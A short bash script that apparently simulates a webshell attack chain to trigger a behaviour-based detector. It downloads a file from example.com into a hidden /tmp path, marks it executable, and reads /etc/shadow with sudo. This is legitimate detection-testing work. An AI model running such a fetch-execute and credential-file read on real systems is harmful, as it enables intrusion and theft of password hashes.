#!/usr/bin/env bash
# 01-webshell.sh — simulates a webshell-style attack chain.
#
# Behavior pattern: a process downloads a payload, makes it executable,
# then reads sensitive credentials. Each step is benign on its own;
# together they form a HIGH/CRITICAL chain.
#
# Safety: only touches /tmp and reads files locally. No real C2.

set -u
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PAYLOAD="/tmp/.poc-webshell-$$"

cleanup() { rm -f "$PAYLOAD" >/dev/null 2>&1 || true; }
trap cleanup EXIT

echo "[*] simulated webshell chain — $(date)"

echo "[1/3] curl downloading 'payload' to $PAYLOAD"
curl -fsSL "https://example.com/" -o "$PAYLOAD" || echo "(curl failed, continuing)"

echo "[2/3] chmod +x $PAYLOAD"
chmod +x "$PAYLOAD"

echo "[3/3] reading /etc/shadow (requires sudo)"
sudo cat /etc/shadow >/dev/null 2>&1 || cat /etc/shadow >/dev/null 2>&1 || true

echo "[+] done."
